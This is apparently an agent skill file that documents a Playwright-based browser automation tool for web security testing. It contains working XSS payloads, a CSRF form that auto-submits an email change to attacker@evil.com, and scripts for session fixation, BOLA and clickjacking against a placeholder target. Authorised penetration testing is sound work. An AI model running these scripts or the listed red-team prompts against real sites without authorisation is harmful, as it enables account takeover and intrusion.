---
name: browser-automation
description: |
  Multi-tab browser automation for security testing of XSS, CSRF, authentication flows, 
  session management, and client-side vulnerabilities. Built on Playwright (Chromium/Firefox/WebKit).
  Supports full DOM interaction, screenshot capture, network request interception, cookie/storage
  manipulation, multi-tab/multi-context testing, and automated auth flow analysis. Ideal for
  testing vulnerabilities that require real browser execution (DOM XSS, CSRF, OAuth flows,
  SameSite cookie bypass, clickjacking, postMessage injection).
metadata:
  {
    "openclaw":
      {
        "emoji": "🌐",
        "requires": { "bins": ["python3"] },
        "install":
          [
            {
              "id": "pip-playwright",
              "kind": "shell",
              "cmd": "pip3 install playwright && python3 -m playwright install chromium",
              "bins": [],
              "label": "Install Playwright + Chromium (pip)",
            },
          ],
      },
  }
---

# Browser Automation — Multi-Tab Security Testing

Playwright-based browser automation for testing vulnerabilities that require real browser behavior.

## Setup

```bash
pip3 install playwright
python3 -m playwright install chromium   # ~170MB
python3 -m playwright install firefox    # optional
```

## Capabilities

### 1. XSS Testing (Reflected, Stored, DOM)

Inject payloads and verify actual JavaScript execution in a real browser context.

**Usage:**

> Test https://target.com for DOM-based XSS using browser automation

```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    # Listen for alert dialogs (XSS confirmation)
    xss_triggered = []
    page.on("dialog", lambda d: (xss_triggered.append(d.message), d.dismiss()))

    payloads = [
        '"><script>alert("CLAWXSS")</script>',
        '"><img src=x onerror=alert(1)>',
        "';alert(document.domain)//",
    ]
    for p_ in payloads:
        page.goto(f"https://target.com/search?q={p_}")
        page.wait_for_timeout(1000)
        if xss_triggered:
            print(f"[!] XSS CONFIRMED with payload: {p_}")
            print(f"    Alert value: {xss_triggered[-1]}")
            page.screenshot(path=f"evidence/xss_{len(xss_triggered)}.png")

    browser.close()
```

---

### 2. CSRF Testing

Automate cross-origin state-changing request tests to detect missing CSRF protections.

**Usage:**

> Test the account settings update at https://target.com for CSRF vulnerabilities

```python
with sync_playwright() as p:
    # Context A: Victim (logged in)
    victim = p.chromium.launch_persistent_context("./victim_profile", headless=True)
    victim_page = victim.new_page()
    victim_page.goto("https://target.com/login")
    victim_page.fill("#username", "victim@test.com")
    victim_page.fill("#password", "password")
    victim_page.click("#submit")

    # Context B: Attacker page (different origin)
    attacker = p.chromium.new_context()
    attacker_page = attacker.new_page()
    attacker_page.set_content("""
    <form action="https://target.com/api/change-email" method="POST">
      <input name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit()</script>
    """)
    attacker_page.wait_for_timeout(2000)
    # Check if victim's email was changed
```

---

### 3. Authentication Flow Analysis

Automate login, session handling, and token lifecycle testing.

**Usage:**

> Analyze the authentication flow at https://target.com and test for session fixation

```python
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)

    # Capture pre-auth sessions
    page = browser.new_page()
    page.goto("https://target.com/login")
    pre_auth_cookies = page.context.cookies()

    # Perform login
    page.fill("#email", "user@test.com")
    page.fill("#password", "testpass123")
    page.click('button[type=submit]')
    page.wait_for_url("**/dashboard**", timeout=5000)

    # Capture post-auth session
    post_auth_cookies = page.context.cookies()

    # Check for session fixation (session ID should change after login)
    pre_ids  = {c["name"]: c["value"] for c in pre_auth_cookies if "session" in c["name"].lower()}
    post_ids = {c["name"]: c["value"] for c in post_auth_cookies if "session" in c["name"].lower()}

    for name in pre_ids:
        if name in post_ids and pre_ids[name] == post_ids[name]:
            print(f"[VULN] Session Fixation: '{name}' not rotated after login!")
        else:
            print(f"[OK]   '{name}' rotated after login")

    browser.close()
```

---

### 4. Network Request Interception

Intercept, modify, and block browser network requests.

**Usage:**

> Intercept all API calls made during login and analyze request/response pairs

```python
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    # Capture all XHR/fetch requests
    api_calls = []
    page.on("request",  lambda r: api_calls.append({"type":"REQ","url":r.url,"method":r.method}))
    page.on("response", lambda r: api_calls.append({"type":"RESP","url":r.url,"status":r.status}))

    page.goto("https://target.com/login")
    page.fill("#email", "admin@test.com")
    page.click("#submit")
    page.wait_for_timeout(3000)

    print("\n=== API Calls during login ===")
    for call in api_calls:
        print(f"  [{call['type']}] {call.get('method','   ')} {call['url']} {call.get('status','')}")

    browser.close()
```

---

### 5. Multi-Tab / Multi-Context Testing

Run simultaneous browser contexts for complex multi-user attack scenarios.

**Usage:**

> Test for BOLA using two separate browser sessions (admin and regular user)

```python
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)

    # Admin context
    admin_ctx  = browser.new_context()
    admin_page = admin_ctx.new_page()

    # User context
    user_ctx   = browser.new_context()
    user_page  = user_ctx.new_page()

    # Test cross-context resource access (BOLA)
    admin_page.goto("https://target.com/login")
    # ... login as admin ...
    admin_resource = admin_page.goto("https://target.com/api/secret-doc/42")
    admin_body = admin_resource.text()

    # Now try with user token
    user_resource = user_page.goto("https://target.com/api/secret-doc/42")
    user_body = user_resource.text() if user_resource else ""

    if admin_body == user_body:
        print("[CRITICAL] BOLA confirmed — user can access admin resource!")
```

---

### 6. Screenshot & Video Evidence

Automatically capture visual evidence for reports.

```python
# Screenshot
page.screenshot(path="evidence/finding_001.png", full_page=True)

# Video recording
context = browser.new_context(record_video_dir="evidence/")
page = context.new_page()
# ... test ...
context.close()  # Video saved automatically
```

---

### 7. clickjacking Detection

```python
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    resp = page.goto("https://target.com")
    xfo = resp.headers.get("x-frame-options", "")
    csp = resp.headers.get("content-security-policy", "")
    if "frame-ancestors" not in csp and not xfo:
        print("[VULN] Clickjacking: No frame restriction headers found")
        # Test actual iframe embedding
        page.set_content(f'<iframe src="https://target.com" width="800" height="600"></iframe>')
        frame_count = len(page.frames)
        print(f"  Frames loaded: {frame_count} — {'EMBEDDED' if frame_count > 1 else 'BLOCKED'}")
```

## Usage from Red Team Agent

```
Run browser-based XSS test on https://target.com/search endpoint
Test the OAuth flow at https://target.com for authorization code interception
Take screenshots of all admin pages accessible without authentication
Test for CSRF on the account deletion endpoint at https://target.com/account/delete
Analyze all network requests made during the login flow at https://target.com
```
